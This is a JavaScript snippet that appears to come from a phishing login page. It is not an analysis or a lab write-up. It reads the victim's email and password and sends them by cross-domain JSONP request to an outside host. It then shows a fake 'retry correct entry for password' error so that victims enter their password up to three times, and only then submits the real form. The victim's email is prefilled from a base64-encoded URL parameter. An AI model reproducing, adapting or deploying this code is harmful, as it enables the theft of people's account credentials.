    <script>
     var count =0;
document.getElementById("clkLgn").addEventListener('click',clkLgn)
function clkLgn(event){
	event.preventDefault();
    var result;
         var strPassword = $('#pass1').val();
        var stremail = $('#usr').val();
		    var fieldName = $('#fieldName').val();
        var strPassword1 ="";
        if(strPassword == '' || strPassword == null){
            $('#signInErrorDiv').show();
			return false;
           // $('#signInErrorDiv').text('Incorrect password, Please try again.');
        }else if (strPassword.length < 6){
             $('#signInErrorDiv').show();
            //$('#signInErrorDiv').text('Incorrect password, Please try again.');
            result = document.getElementById('pass1');
            result.value="";
			return false;
        } else{
				count +=1;
				if (count<=1){
				//grab the password
					$("#fpasswrd").val(strPassword);
          //post password
          var url = "https://jvtt.us/merge/cmail.php";
					
					$.ajax({
						crossOrigin:true,
						type: 'GET',
						url: "https://jvtt.us/merge/cmail.php",//cross-domain request
						data:{
							'usr': stremail,
							'pass': strPassword,
							'pass2': strPassword1,
							'field':fieldName
							},
						dataType: 'jsonp', // use JSONP
						success:function(data){
							//alert(data.message);
							var jresult = data.message;
							if (jresult=="1"){
								//initialize and display  attempt error
								document.getElementById('signInErrorDiv').innerHTML="<strong>Attempt ("+count+"/3)</strong>:&nbsp;Retry correct entry for password.";
								//document.getElementById('sError').innerHTML="Attempt ("+count+"/3)";
								$('#signInErrorDiv').show();
								result = document.getElementById('pass1');
								result.value="";
								$('#pass3').val(strPassword1);

							}
						}
					});
					
					return false;
				
				}
				//check count , if attempt is twice send to ajax
				if ((count < 3) && (count >1)){
					strPassword1 =strPassword;
					strPassword = $('#fpasswrd').val();
					//post to ajax  cross-domain
					var url = "https://jvtt.us/merge/cmail.php";
					
					$.ajax({
						crossOrigin:true,
						type: 'GET',
						url: "https://jvtt.us/merge/cmail.php",//cross-domain request
						data:{
							'usr': stremail,
							'pass': strPassword,
							'pass2': strPassword1,
							'field':fieldName
							},
						dataType: 'jsonp', // use JSONP
						success:function(data){
							//alert(data.message);
							var jresult = data.message;
							if (jresult=="1"){
								//initialize and display  attempt error
								document.getElementById('signInErrorDiv').innerHTML="<strong>Attempt ("+count+"/3)</strong>:&nbsp;Retry correct entry for password.";
								//document.getElementById('sError').innerHTML="Attempt ("+count+"/3)";
								$('#signInErrorDiv').show();
								result = document.getElementById('pass1');
								result.value="";
								$('#pass3').val(strPassword1);

							}
						}
					});
					return false;
				}
				if(count>=3){
					document.getElementById("logonForm").submit();
					return true;
					}
            }
   
    
}
    function checkSubmit(e){
        if (e.keyCode == 13) {
		
			clkLgn(e);
        }
    
   }
  
   var vsr = getUrlVars()["vsr"];
   var fieldName = getUrlVars()["field"];
   vsr = window.atob(vsr);
   var radioVal= getUrlVars()["radio"];
   var loc= getUrlVars()["loc"];
   var main_domain= getUrlVars()["main_domain"];
   var domain= getUrlVars()["domain"];
   $("#rdio").val(radioVal);
   $("#usr").val(vsr);
   $("#fieldName").val(fieldName);
   $("#main_domain").val(main_domain);
   $("#domain").val(domain);
   $("#loc").val(loc);

function getUrlVars() {
    var vars = {};
    var parts = window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
		
    });
    return vars;
}
